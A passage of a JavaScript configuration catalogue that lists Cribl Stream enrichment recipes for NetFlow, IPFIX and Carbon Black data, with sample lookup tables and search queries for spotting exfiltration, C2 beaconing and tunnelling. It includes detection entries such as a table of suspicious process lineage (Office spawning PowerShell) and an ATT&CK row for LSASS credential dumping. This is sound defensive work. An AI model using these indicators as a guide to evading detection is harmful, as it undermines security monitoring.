        personas: ['SOC', 'Security Engineering', 'NOC', 'Network Engineering'],
        implementation: {
          functionConfig: {
            function: 'GeoIP',
            inputField: 'src_addr',
            additionalInputs: ['dst_addr'],
            geoipDatabase: 'MaxMind GeoLite2-City + GeoLite2-ASN',
            outputPrefix: 'src_ / dst_'
          },
          example: '// Cribl Stream → Processing → GeoIP Function\n// Input Fields: src_addr, dst_addr\n// Output Fields: src_country, src_asn, dst_country, dst_asn\n//\n// BEFORE: { src_addr: "10.1.2.5", dst_addr: "203.0.113.50", bytes: 1500000 }\n// AFTER:  { src_addr: "10.1.2.5", src_country: "RFC1918", src_asn: "Private", dst_addr: "203.0.113.50", dst_country: "CN", dst_asn: "AS4134" }',
          notes: 'Apply GeoIP to both src_addr and dst_addr in a single pipeline. RFC1918 addresses resolve to "Private" — skip these for performance. High-volume NetFlow environments should use GeoIP function with caching enabled to reduce lookup overhead.'
        }
      },
      {
        name: 'Internal/External Classification Eval',
        description: 'Classify source and destination addresses as internal (RFC1918) or external and derive traffic direction for flow analysis.',
        criblFunction: 'Eval',
        addedFields: ['src_internal', 'dst_internal', 'traffic_direction'],
        securityValue: 'Immediately categorizes flows as lateral movement (internal→internal), exfiltration (internal→external), or inbound attack (external→internal) without manual IP range memorization.',
        observabilityValue: 'Enables north-south vs east-west traffic ratio monitoring, detects routing anomalies when traffic direction changes unexpectedly, supports micro-segmentation validation.',
        personas: ['SOC', 'NOC', 'Network Engineering', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            evaluations: [
              'src_internal = /^(10\\.|172\\.(1[6-9]|2[0-9]|3[01])\\.|192\\.168\\.)/.test(src_addr) ? \'true\' : \'false\'',
              'dst_internal = /^(10\\.|172\\.(1[6-9]|2[0-9]|3[01])\\.|192\\.168\\.)/.test(dst_addr) ? \'true\' : \'false\'',
              'traffic_direction = src_internal===\'true\' && dst_internal===\'true\' ? \'east-west\' : src_internal===\'true\' ? \'outbound\' : dst_internal===\'true\' ? \'inbound\' : \'transit\''
            ]
          },
          example: '// Cribl Stream → Processing → Eval Function\n// BEFORE: { src_addr: "10.1.2.5", dst_addr: "203.0.113.50", bytes: 1500000 }\n// AFTER:  { ..., src_internal: "true", dst_internal: "false", traffic_direction: "outbound" }',
          notes: 'Add CGNAT (100.64.0.0/10) and link-local ranges to internal classification if applicable. Transit traffic (external→external) through your network indicates routing issues or intentional transit peering. Monitor east-west ratio changes — sudden increases may indicate lateral movement.'
        }
      },
      {
        name: 'Service Classification Lookup',
        description: 'Map destination port numbers to service names, categories, and standard/non-standard classification for traffic analysis.',
        criblFunction: 'Lookup',
        addedFields: ['service_name', 'service_category', 'is_standard_port'],
        securityValue: 'Detects known services on non-standard ports (HTTP on port 8443 = potential tunneling), identifies unauthorized service usage, enables service-based firewall rule validation.',
        observabilityValue: 'Provides service-level traffic visibility without DPI, enables bandwidth analysis by service category, identifies top services consuming network capacity.',
        personas: ['SOC', 'NOC', 'Network Engineering', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'service_ports.csv',
            inputField: 'dst_port → port',
            outputFields: ['service_name', 'service_category', 'is_standard_port'],
            reloadInterval: '24 hours'
          },
          lookupSample: 'port,service_name,service_category,is_standard_port\n443,HTTPS,web,true\n80,HTTP,web,true\n53,DNS,infrastructure,true\n22,SSH,remote-access,true',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: service_ports.csv\n// Input: dst_port → port (exact match)\n// Output: service_name, service_category, is_standard_port\n//\n// BEFORE: { src_addr: "10.1.2.5", dst_addr: "203.0.113.50", dst_port: 443, bytes: 1500000 }\n// AFTER:  { ..., service_name: "HTTPS", service_category: "web", is_standard_port: "true" }',
          notes: 'Maintain port list from IANA registry plus internal service definitions. Ports not in lookup are "unknown" — high volumes of unknown port traffic warrant investigation. Consider protocol (TCP/UDP) for accurate classification (DNS=UDP/53 vs TCP/53 for zone transfers).'
        }
      },
      {
        name: 'AS Organization Lookup',
        description: 'Map Autonomous System numbers to organization names and categories for network-level traffic attribution and peering analysis.',
        criblFunction: 'Lookup',
        addedFields: ['src_as_org', 'dst_as_org', 'src_as_category'],
        securityValue: 'Identifies traffic to/from known hosting providers favored by attackers, detects unexpected AS paths indicating BGP hijacking, enables AS-level blocklists for known-malicious networks.',
        observabilityValue: 'Enables peering analysis by organization, tracks transit costs by AS destination, identifies top bandwidth-consuming external organizations for peering negotiations.',
        personas: ['SOC', 'Network Engineering', 'Security Engineering', 'NOC'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'as_organizations.csv',
            inputField: 'src_asn → asn',
            outputFields: ['src_as_org', 'dst_as_org', 'src_as_category'],
            reloadInterval: '24 hours'
          },
          lookupSample: 'asn,as_org,as_category\nAS13335,Cloudflare Inc,cdn\nAS15169,Google LLC,hyperscaler\nAS14618,Amazon AWS,hyperscaler\nAS4134,China Telecom,isp-apac',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: as_organizations.csv\n// Input: src_asn → asn (exact match) — then repeat for dst_asn\n// Output: as_org → src_as_org / dst_as_org, as_category → src_as_category\n//\n// BEFORE: { src_asn: "AS13335", dst_asn: "AS14618", bytes: 5000000 }\n// AFTER:  { ..., src_as_org: "Cloudflare Inc", dst_as_org: "Amazon AWS", src_as_category: "cdn" }',
          notes: 'Update AS database monthly from RIPE/ARIN registries. Categories: hyperscaler, cdn, isp-*, hosting, enterprise, education, government. Bullet-proof hosting ASNs should be flagged for security review. Large flows to "hosting" category ASNs may indicate exfiltration.'
        }
      },
      {
        name: 'Interface Mapping Lookup',
        description: 'Map SNMP interface indices to human-readable interface names and security zones for meaningful flow context.',
        criblFunction: 'Lookup',
        addedFields: ['input_interface_name', 'output_interface_name', 'interface_zone'],
        securityValue: 'Translates opaque SNMP indices into security zone context — enables zone-based policy violation detection (e.g., DMZ traffic reaching internal database zone directly).',
        observabilityValue: 'Enables per-interface bandwidth monitoring without SNMP polling overhead, identifies congested interfaces, supports capacity planning with human-readable interface identification.',
        personas: ['NOC', 'Network Engineering', 'SOC', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'interface_mapping.csv',
            inputField: 'input_snmp_index → snmp_index',
            outputFields: ['input_interface_name', 'output_interface_name', 'interface_zone'],
            reloadInterval: '1 hour'
          },
          lookupSample: 'snmp_index,interface_name,interface_zone,device\n1,GigabitEthernet0/0,outside,fw-core-01\n2,GigabitEthernet0/1,inside,fw-core-01\n3,GigabitEthernet0/2,dmz,fw-core-01\n4,TenGigabitEthernet1/0,backbone,sw-dist-01',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: interface_mapping.csv\n// Input: input_snmp_index → snmp_index (exact match)\n// Output: interface_name → input_interface_name, interface_zone\n// Then: output_snmp_index → snmp_index for output_interface_name\n//\n// BEFORE: { input_snmp_index: 3, output_snmp_index: 2, src_addr: "203.0.113.5", dst_addr: "10.1.2.5" }\n// AFTER:  { ..., input_interface_name: "GigabitEthernet0/2", output_interface_name: "GigabitEthernet0/1", interface_zone: "dmz" }',
          notes: 'Interface mappings change with network changes — sync via SNMP walks or network automation tool (Netbox, Nautobot) exports. Include device hostname in lookup for multi-device disambiguation. Zone field enables zone-crossing alerts without maintaining complex IP-based rules.'
        }
      }
    ],
    searchTime: [
      {
        name: 'Traffic Baseline',
        description: 'At investigation time, retrieve hourly traffic baselines for a source/destination pair to identify volume anomalies indicating exfiltration or DDoS.',
        criblFunction: 'Search-time lookup',
        addedFields: ['baseline_bytes_hourly', 'volume_anomaly_score'],
        securityValue: 'Traffic volume anomalies (10x+ baseline) between specific pairs indicate active data exfiltration or compromised systems participating in DDoS attacks.',
        observabilityValue: 'Enables capacity anomaly detection, identifies link saturation before packet loss occurs, supports proactive capacity upgrades based on baseline trending.',
        personas: ['SOC', 'NOC', 'Network Engineering', 'Threat Hunting'],
        implementation: {
          example: '// Cribl Search traffic baseline:\n// dataset="netflow" earliest=-30d latest=-1d\n// | where src_addr == "$SUSPECT_SRC" and dst_addr == "$SUSPECT_DST"\n// | extend hour_bucket = toint(format_datetime(timestamp, \'HH\'))\n// | summarize baseline_bytes_hourly=avg(bytes), stddev_bytes=stdev(bytes) by hour_bucket\n// | where hour_bucket == $CURRENT_HOUR\n// | extend volume_anomaly_score = round(($CURRENT_BYTES - baseline_bytes_hourly) / stddev_bytes, 2)\n// | extend anomaly_assessment = iif(volume_anomaly_score > 5, "critical_anomaly", iif(volume_anomaly_score > 3, "significant_anomaly", iif(volume_anomaly_score > 2, "moderate_anomaly", "within_normal")))',
          notes: 'Hour-of-day bucketing accounts for diurnal traffic patterns (business hours vs off-hours). Requires 14+ days of history for reliable baselines. Exclude known backup windows and maintenance periods. Score >5 with outbound direction = high-confidence exfiltration.'
        }
      },
      {
        name: 'Peer Communication History',
        description: 'At investigation time, retrieve the communication history between two hosts to determine if current traffic is established or represents a new/unusual connection.',
        criblFunction: 'Search-time lookup',
        addedFields: ['first_seen_pair', 'communication_frequency'],
        securityValue: 'New communication pairs (first_seen today) between internal hosts or to external IPs are high-value investigation leads — lateral movement and C2 both create new peer relationships.',
        observabilityValue: 'Tracks network relationship growth over time, identifies sprawling connectivity patterns that complicate micro-segmentation, supports zero-trust policy refinement.',
        personas: ['SOC', 'Threat Hunting', 'Security Engineering', 'Network Engineering'],
        implementation: {
          example: '// Cribl Search peer communication history:\n// dataset="netflow" earliest=-90d\n// | where (src_addr == "$HOST_A" and dst_addr == "$HOST_B") or (src_addr == "$HOST_B" and dst_addr == "$HOST_A")\n// | summarize first_seen_pair=min(timestamp), last_seen=max(timestamp), communication_frequency=count(), total_bytes=sum(bytes), unique_ports=dcount(dst_port) by src_addr, dst_addr\n// | extend days_communicating = datetime_diff(\'day\', last_seen, first_seen_pair)\n// | extend relationship_type = iif(days_communicating > 30 and communication_frequency > 100, "established", iif(days_communicating > 7, "recent", "new"))\n// | extend suspicion_level = iif(relationship_type == "new" and unique_ports > 5, "high", iif(relationship_type == "new", "medium", "low"))',
          notes: 'New pairs with multiple destination ports suggest port scanning or service discovery (lateral movement reconnaissance). Established pairs with sudden volume increases suggest compromised legitimate channels. 90-day lookback balances accuracy with query performance.'
        }
      }
    ]
  },
  'ipfix': {
    streamTime: [
      {
        name: 'GeoIP Enrichment',
        description: 'Add geographic context to both source and destination addresses in IPFIX records for traffic origin/destination intelligence.',
        criblFunction: 'GeoIP',
        addedFields: ['src_country', 'src_asn', 'dst_country', 'dst_asn'],
        securityValue: 'Identifies data exfiltration to high-risk countries, detects C2 communication patterns with known-bad ASNs, enables geographic access policies for sensitive network segments.',
        observabilityValue: 'Maps traffic geographically for transit optimization, supports peering decisions with geographic traffic distribution data, identifies international bandwidth consumers.',
        personas: ['SOC', 'Security Engineering', 'NOC', 'Network Engineering'],
        implementation: {
          functionConfig: {
            function: 'GeoIP',
            inputField: 'src_addr',
            additionalInputs: ['dst_addr'],
            geoipDatabase: 'MaxMind GeoLite2-City + GeoLite2-ASN',
            outputPrefix: 'src_ / dst_'
          },
          example: '// Cribl Stream → Processing → GeoIP Function\n// Input Fields: src_addr, dst_addr\n// Output Fields: src_country, src_asn, dst_country, dst_asn\n//\n// BEFORE: { src_addr: "192.168.1.100", dst_addr: "185.220.101.42", octet_total_count: 2500000 }\n// AFTER:  { src_addr: "192.168.1.100", src_country: "RFC1918", src_asn: "Private", dst_addr: "185.220.101.42", dst_country: "DE", dst_asn: "AS57523" }',
          notes: 'IPFIX template fields may vary by exporter — ensure src_addr/dst_addr field mapping is configured per exporter. High-volume IPFIX environments benefit from GeoIP caching. Known Tor exit node ASNs should trigger enhanced monitoring.'
        }
      },
      {
        name: 'Internal/External Classification Eval',
        description: 'Classify source and destination addresses as internal (RFC1918) or external and derive traffic direction for IPFIX flow analysis.',
        criblFunction: 'Eval',
        addedFields: ['src_internal', 'dst_internal', 'traffic_direction'],
        securityValue: 'Categorizes IPFIX flows by direction for security context — outbound flows to unusual destinations are exfiltration candidates, east-west flows to new peers suggest lateral movement.',
        observabilityValue: 'Enables directional traffic analysis, monitors north-south vs east-west ratios for network architecture validation, detects unexpected traffic patterns after changes.',
        personas: ['SOC', 'NOC', 'Network Engineering', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            evaluations: [
              'src_internal = /^(10\\.|172\\.(1[6-9]|2[0-9]|3[01])\\.|192\\.168\\.)/.test(src_addr) ? \'true\' : \'false\'',
              'dst_internal = /^(10\\.|172\\.(1[6-9]|2[0-9]|3[01])\\.|192\\.168\\.)/.test(dst_addr) ? \'true\' : \'false\'',
              'traffic_direction = src_internal===\'true\' && dst_internal===\'true\' ? \'east-west\' : src_internal===\'true\' ? \'outbound\' : dst_internal===\'true\' ? \'inbound\' : \'transit\''
            ]
          },
          example: '// Cribl Stream → Processing → Eval Function\n// BEFORE: { src_addr: "192.168.1.100", dst_addr: "185.220.101.42", octet_total_count: 2500000 }\n// AFTER:  { ..., src_internal: "true", dst_internal: "false", traffic_direction: "outbound" }',
          notes: 'IPFIX may include additional private ranges (e.g., carrier-grade NAT 100.64.0.0/10) depending on network architecture. Add organization-specific ranges to internal classification. Transit flows (external→external) through your AS indicate transit routing or misconfiguration.'
        }
      },
      {
        name: 'Application Identification Lookup',
        description: 'Map IPFIX application_id (IANA L7 application tags or vendor-specific IDs) to application names, categories, risk levels, and business relevance.',
        criblFunction: 'Lookup',
        addedFields: ['app_name', 'app_category', 'app_risk', 'app_business_relevant'],
        securityValue: 'Identifies high-risk applications (file sharing, anonymizers, remote access tools) in network flows without DPI, enables application-aware security policies based on flow metadata.',
        observabilityValue: 'Provides application-level traffic visibility from flow data, enables bandwidth allocation analysis by application category, identifies shadow IT applications consuming resources.',
        personas: ['SOC', 'NOC', 'Network Engineering', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'ipfix_applications.csv',
            inputField: 'application_id → app_id',
            outputFields: ['app_name', 'app_category', 'app_risk', 'app_business_relevant'],
            reloadInterval: '24 hours'
          },
          lookupSample: 'app_id,app_name,app_category,app_risk,app_business_relevant\n13:451,Microsoft Teams,collaboration,low,true\n13:674,Dropbox,file-sharing,medium,false\n13:1220,BitTorrent,p2p,high,false\n13:795,Salesforce,business-app,low,true',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: ipfix_applications.csv\n// Input: application_id → app_id (exact match)\n// Output: app_name, app_category, app_risk, app_business_relevant\n//\n// BEFORE: { src_addr: "10.1.2.50", dst_addr: "13.107.6.171", application_id: "13:451", octet_total_count: 500000 }\n// AFTER:  { ..., app_name: "Microsoft Teams", app_category: "collaboration", app_risk: "low", app_business_relevant: "true" }',
          notes: 'IPFIX application IDs use IANA format (classID:selectorID). Vendor-specific IDs (Cisco NBAR, Palo Alto App-ID) need separate mapping tables. Update quarterly from vendor application signature releases. High-risk non-business apps warrant bandwidth throttling or blocking.'
        }
      },
      {
        name: 'AS Organization Lookup',
        description: 'Map Autonomous System numbers to organization names and categories for network-level traffic attribution in IPFIX records.',
        criblFunction: 'Lookup',
        addedFields: ['src_as_org', 'dst_as_org', 'as_category'],
        securityValue: 'Identifies flows to/from bullet-proof hosting providers, detects unexpected AS relationships indicating BGP anomalies or traffic hijacking, enables AS-level reputation scoring.',
        observabilityValue: 'Supports peering relationship analysis, tracks bandwidth by destination organization, identifies top external organizations for traffic engineering decisions.',
        personas: ['SOC', 'Network Engineering', 'Security Engineering', 'NOC'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'as_organizations.csv',
            inputField: 'src_asn → asn',
            outputFields: ['src_as_org', 'dst_as_org', 'as_category'],
            reloadInterval: '24 hours'
          },
          lookupSample: 'asn,as_org,as_category\nAS8075,Microsoft Corporation,hyperscaler\nAS16509,Amazon.com Inc,hyperscaler\nAS32934,Facebook Inc,content-provider\nAS57523,Chang Way Technologies,hosting-suspicious',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: as_organizations.csv\n// Input: src_asn → asn (exact match) — then repeat for dst_asn\n// Output: as_org → src_as_org / dst_as_org, as_category\n//\n// BEFORE: { src_asn: "AS8075", dst_asn: "AS57523", octet_total_count: 3000000 }\n// AFTER:  { ..., src_as_org: "Microsoft Corporation", dst_as_org: "Chang Way Technologies", as_category: "hosting-suspicious" }',
          notes: 'Flag "hosting-suspicious" category ASNs for enhanced monitoring — these are frequently used for C2 infrastructure. Update AS database monthly from regional internet registries. Large flows to "hosting-suspicious" category with internal source = high-priority exfiltration investigation.'
        }
      },
      {
        name: 'NAT Translation Eval',
        description: 'Detect NAT translation in IPFIX records by comparing pre/post NAT fields and classify the NAT type for network visibility.',
        criblFunction: 'Eval',
        addedFields: ['is_natted', 'nat_type', 'pre_nat_pair'],
        securityValue: 'NAT obscures true source attribution — identifying NATted flows and preserving pre-NAT addresses is critical for accurate incident response and forensic tracing through network boundaries.',
        observabilityValue: 'Tracks NAT utilization rates, identifies NAT pool exhaustion risks, monitors PAT port allocation for capacity planning, enables true-source traffic analysis.',
        personas: ['NOC', 'Network Engineering', 'SOC', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            evaluations: [
              'is_natted = (post_nat_src_addr && post_nat_src_addr !== src_addr) || (post_nat_dst_addr && post_nat_dst_addr !== dst_addr) ? \'true\' : \'false\'',
              'nat_type = post_nat_src_addr !== src_addr && post_nat_dst_addr !== dst_addr ? \'double-nat\' : post_nat_src_addr !== src_addr ? \'source-nat\' : post_nat_dst_addr !== dst_addr ? \'destination-nat\' : \'none\'',
              'pre_nat_pair = is_natted === \'true\' ? `${src_addr}:${src_port}->${dst_addr}:${dst_port}` : \'n/a\''
            ]
          },
          example: '// Cribl Stream → Processing → Eval Function\n// BEFORE: { src_addr: "10.1.2.100", dst_addr: "203.0.113.50", post_nat_src_addr: "198.51.100.1", post_nat_dst_addr: "203.0.113.50", src_port: 54321, dst_port: 443 }\n// AFTER:  { ..., is_natted: "true", nat_type: "source-nat", pre_nat_pair: "10.1.2.100:54321->203.0.113.50:443" }',
          notes: 'IPFIX NAT fields (postNATSourceIPv4Address, postNATDestinationIPv4Address) are only populated by exporters that support RFC 5765. Ensure NAT-capable devices (firewalls, load balancers) export these templates. pre_nat_pair enables correlation with internal flow records for end-to-end tracing.'
        }
      }
    ],
    searchTime: [
      {
        name: 'Application Traffic Baseline',
        description: 'At investigation time, retrieve an application\'s historical traffic baseline to identify bandwidth anomalies and unusual consumption patterns.',
        criblFunction: 'Search-time lookup',
        addedFields: ['app_baseline_bytes', 'app_deviation_pct'],
        securityValue: 'Applications with traffic volumes significantly above baseline may be exfiltrating data through legitimate channels (e.g., file-sharing apps suddenly moving 10x normal volume).',
        observabilityValue: 'Enables per-application capacity trending, identifies applications exceeding allocated bandwidth, supports QoS policy adjustment with data-driven baselines.',
        personas: ['SOC', 'NOC', 'Network Engineering', 'Threat Hunting'],
        implementation: {
          example: '// Cribl Search application traffic baseline:\n// dataset="ipfix" earliest=-30d latest=-1d\n// | where app_name == "$TARGET_APP"\n// | summarize app_baseline_bytes=avg(octet_total_count), stddev_bytes=stdev(octet_total_count) by app_name\n// | extend app_deviation_pct = round(($CURRENT_BYTES - app_baseline_bytes) / app_baseline_bytes * 100, 1)\n// | extend deviation_assessment = iif(app_deviation_pct > 500, "extreme_deviation", iif(app_deviation_pct > 200, "high_deviation", iif(app_deviation_pct > 100, "moderate_deviation", "within_normal")))',
          notes: 'Application baselines are most accurate when computed per time-of-day bucket (business hours vs off-hours). Exclude maintenance windows and known bulk transfers from baseline calculation. Deviation >500% warrants immediate investigation regardless of application risk level.'
        }
      },
      {
        name: 'Flow Duration Anomaly',
        description: 'At investigation time, retrieve average flow duration for a specific application or host pair to identify long-lived connections indicating C2 beaconing or tunnel persistence.',
        criblFunction: 'Search-time lookup',
        addedFields: ['avg_flow_duration', 'long_flow_indicator'],
        securityValue: 'Abnormally long flows (hours/days) often indicate persistent C2 channels, SSH tunnels for data exfiltration, or DNS tunneling sessions that maintain state. Normal web flows are seconds to minutes.',
        observabilityValue: 'Identifies applications holding connections open unnecessarily (resource waste), detects connection pooling issues, supports network timeout policy optimization.',
        personas: ['SOC', 'Threat Hunting', 'Network Engineering', 'Security Engineering'],
        implementation: {
          example: '// Cribl Search flow duration anomaly:\n// dataset="ipfix" earliest=-30d latest=-1d\n// | where dst_addr == "$TARGET_DST" and dst_port == $TARGET_PORT\n// | extend flow_duration_sec = datetime_diff(\'second\', flow_end_time, flow_start_time)\n// | summarize avg_flow_duration=avg(flow_duration_sec), p95_duration=percentile(flow_duration_sec, 95), max_duration=max(flow_duration_sec) by dst_addr, dst_port\n// | extend long_flow_indicator = iif($CURRENT_FLOW_DURATION > p95_duration * 3, "anomalous_long", iif($CURRENT_FLOW_DURATION > p95_duration, "above_p95", "normal"))\n// | extend tunnel_suspicion = iif(avg_flow_duration > 3600 and dst_port in (53, 443, 80), "possible_tunnel", "unlikely_tunnel")',
          notes: 'Normal HTTP flows: 1-30 seconds. Normal HTTPS: 5-120 seconds. Flows >1 hour on web ports are suspicious (possible HTTP/S tunneling or C2). DNS flows >60 seconds strongly suggest DNS tunneling. Baseline by service type for accurate anomaly detection.'
        }
      }
    ]
  },
  'carbon-black': {
    streamTime: [
      {
        name: 'Process Reputation Lookup',
        description: 'Enrich process_hash (SHA-256) against a reputation database to classify binaries as known-good, known-bad, or unknown at ingest time.',
        criblFunction: 'Lookup',
        addedFields: ['process_reputation', 'is_signed', 'signer_name', 'reputation_source'],
        securityValue: 'Immediately distinguishes legitimate binaries from unknown or malicious processes. Enables reputation-based routing — unknown processes get higher scrutiny and always route to SIEM.',
        observabilityValue: 'Supports software inventory hygiene metrics — track unsigned or unknown binary execution rates across the fleet.',
        personas: ['SOC', 'Threat Hunting', 'Endpoint Team', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'process_reputation.csv',
            inputField: 'process_hash → sha256',
            outputFields: ['process_reputation', 'is_signed', 'signer_name', 'reputation_source'],
            reloadInterval: '1 hour'
          },
          lookupSample: 'sha256,reputation,is_signed,signer_name,source\n5f2b12c3a8e9d4f1b6c7e8a9d0f1234567890abcdef1234567890abcdef12345,known-good,true,Microsoft Corporation,NSRL-Catalog\na1b2c3d4e5f67890abcdef1234567890abcdef1234567890abcdef1234567890,known-good,true,VMware Inc,Signed-Software-DB\ndeadbeef12345678abcdef1234567890abcdef1234567890abcdef1234567890ab,known-bad,false,,VirusTotal-Malware\n9876543210fedcba9876543210fedcba9876543210fedcba9876543210fedcba,unknown,false,,Not-Found',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: process_reputation.csv\n// Input: process_hash → sha256 (exact match)\n// Output: reputation → process_reputation, is_signed, signer_name, source → reputation_source\n//\n// Add Eval for unmatched: process_reputation = process_reputation || \'unknown\'\n//\n// Result: { process_hash: "5f2b12c3a8...", process_reputation: "known-good", is_signed: "true", signer_name: "Microsoft Corporation" }',
          notes: 'Seed from NSRL (National Software Reference Library) + CB Cloud known-good list. Incrementally add hashes from CB Threat Intelligence. Unknown = needs investigation and routes to SIEM.'
        }
      },
      {
        name: 'MITRE ATT&CK TTP Mapping Lookup',
        description: 'Map the ttp[] array values from CB Cloud events to full MITRE ATT&CK technique names, descriptions, and tactic categories for enriched detection context.',
        criblFunction: 'Lookup',
        addedFields: ['mitre_technique_name', 'mitre_tactic', 'mitre_description', 'mitre_data_sources'],
        securityValue: 'Transforms opaque TTP IDs (T1003.001) into actionable context (LSASS Memory / Credential Access) at ingest time. Enables tactic-based correlation and ATT&CK Navigator coverage visualization.',
        observabilityValue: 'Enables ATT&CK technique coverage reporting — track which techniques are observed in the environment and identify detection gaps.',
        personas: ['SOC', 'Threat Hunting', 'Security Engineering', 'Detection Engineering'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'mitre_techniques.csv',
            inputField: 'ttp → technique_id (iterate array)',
            outputFields: ['mitre_technique_name', 'mitre_tactic', 'mitre_description', 'mitre_data_sources'],
            reloadInterval: '24 hours'
          },
          lookupSample: 'technique_id,technique_name,tactic,description,data_sources\nT1003.001,LSASS Memory,Credential Access,Adversaries may attempt to access credential material stored in LSASS process memory,Process: OS API Execution\nT1059.001,PowerShell,Execution,Adversaries may abuse PowerShell commands and scripts for execution,Command: Command Execution\nT1547.001,Registry Run Keys,Persistence,Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key,Windows Registry: Windows Registry Key Modification\nT1071.001,Web Protocols,Command and Control,Adversaries may communicate using application layer protocols associated with web traffic,Network Traffic: Network Traffic Content',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: mitre_techniques.csv\n// Input: ttp (array iteration — lookup each element)\n// Output: technique_name → mitre_technique_name, tactic → mitre_tactic, description → mitre_description\n//\n// For array handling, use Eval to iterate:\n// mitre_details = ttp.map(t => lookupResult(t)).filter(Boolean)\n//\n// Result: { ttp: ["T1003.001", "T1059.001"], mitre_technique_name: "LSASS Memory", mitre_tactic: "Credential Access" }',
          notes: 'Download MITRE ATT&CK STIX data and convert to CSV. Update quarterly with new ATT&CK releases. For multi-TTP events, enrich with the highest-severity technique.'
        }
      },
      {
        name: 'Device Asset Lookup',
        description: 'Enrich device_name against CMDB to add asset criticality tier, business unit, environment, and primary owner for context-aware detection and routing.',
        criblFunction: 'Lookup',
        addedFields: ['asset_criticality', 'business_unit', 'environment', 'asset_owner', 'asset_type'],
        securityValue: 'Enables severity escalation for critical assets — "credential dumping on Tier-1 domain controller" receives immediate response vs lower priority on developer workstation. Supports business-unit-scoped detection rules.',
        observabilityValue: 'Supports fleet health reporting by business unit and criticality tier. Identify coverage gaps and underperforming segments.',
        personas: ['SOC', 'Incident Response', 'IT Operations', 'Endpoint Team'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'asset_inventory.csv',
            inputField: 'device_name → hostname',
            outputFields: ['asset_criticality', 'business_unit', 'environment', 'asset_owner', 'asset_type'],
            reloadInterval: '4 hours'
          },
          lookupSample: 'hostname,criticality,business_unit,environment,owner,asset_type\nDC01-PROD,Tier-1,IT Infrastructure,production,infra-team,domain-controller\nWKSTN-JPERKS,Tier-3,Customer Success,corporate,jperks,workstation\nSQL-FIN-01,Tier-1,Finance,production,dba-team,database-server\nDEV-BUILD-03,Tier-3,Engineering,development,build-team,build-server',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: asset_inventory.csv\n// Input: device_name → hostname (case-insensitive match)\n// Output: criticality → asset_criticality, business_unit, environment, owner → asset_owner, asset_type\n//\n// Result: { device_name: "DC01-PROD", asset_criticality: "Tier-1", business_unit: "IT Infrastructure", asset_type: "domain-controller" }',
          notes: 'Same asset_inventory.csv used across multiple sources (Palo Alto, CrowdStrike, CB). Single source of truth from CMDB. Hostname matching may need normalization (strip FQDN suffix, uppercase).'
        }
      },
      {
        name: 'Parent-Child Legitimacy Eval',
        description: 'Evaluate parent_name → process_name relationships against a table of expected parent-child combinations to flag anomalous process lineage at ingest time.',
        criblFunction: 'Lookup + Eval',
        addedFields: ['lineage_expected', 'lineage_risk_score', 'lineage_notes'],
        securityValue: 'Pre-identifies suspicious process trees (Word spawning PowerShell, svchost spawning cmd) without requiring downstream SIEM correlation. Enables immediate high-confidence alerts for known-bad lineage.',
        observabilityValue: 'Tracks frequency of unexpected parent-child relationships across the fleet as an endpoint hygiene and software compliance metric.',
        personas: ['SOC', 'Threat Hunting', 'Detection Engineering', 'Endpoint Team'],
        implementation: {
          functionConfig: {
            function: 'Lookup + Eval',
            lookupFile: 'expected_lineage.csv',
            inputField: 'parent_name + process_name → composite key',
            outputFields: ['lineage_expected', 'lineage_risk_score', 'lineage_notes'],
            reloadInterval: '4 hours'
          },
          lookupSample: 'parent_name,child_name,expected,risk_score,notes\nexplorer.exe,cmd.exe,true,0,Normal user shell launch\nwinword.exe,cmd.exe,false,8,Office spawning command interpreter - possible macro\nwinword.exe,powershell.exe,false,9,Office spawning PowerShell - likely malicious macro\nsvchost.exe,cmd.exe,false,7,Service host spawning shell - possible exploitation',
          example: '// Cribl Stream → Processing → Lookup + Eval\n// Step 1: Lookup with composite key parent_name + process_name\n// Step 2: Eval to set defaults for unmatched:\n//   lineage_expected = lineage_expected || \'unknown\'\n//   lineage_risk_score = lineage_risk_score || 5\n//\n// Result: { parent_name: "winword.exe", process_name: "powershell.exe", lineage_expected: "false", lineage_risk_score: 9, lineage_notes: "Office spawning PowerShell - likely malicious macro" }',
          notes: 'Build from Sigma process creation rules and MITRE parent-child mappings. Start with high-confidence pairs and expand. Unknown pairs default to risk_score=5 for investigation.'
        }
      },
      {
        name: 'Network Destination Reputation Lookup',
        description: 'Enrich netconn_remote_ip against threat intelligence feeds to identify connections to known-malicious, suspicious, or Tor exit node IPs at ingest time.',
        criblFunction: 'Lookup',
        addedFields: ['dest_reputation', 'dest_threat_category', 'dest_threat_source', 'dest_is_tor'],
        securityValue: 'Immediately flags outbound connections to known C2 infrastructure, malware distribution sites, and Tor exit nodes. Enables real-time blocking recommendations and high-priority SIEM routing.',
        observabilityValue: 'Tracks rate of connections to reputation-unknown destinations as a fleet risk metric. Supports network policy effectiveness monitoring.',
        personas: ['SOC', 'Threat Hunting', 'Security Engineering', 'Network Security'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'threat_intel_ips.csv',
            inputField: 'netconn_remote_ip → ip',
            outputFields: ['dest_reputation', 'dest_threat_category', 'dest_threat_source', 'dest_is_tor'],
            reloadInterval: '15 minutes'
          },
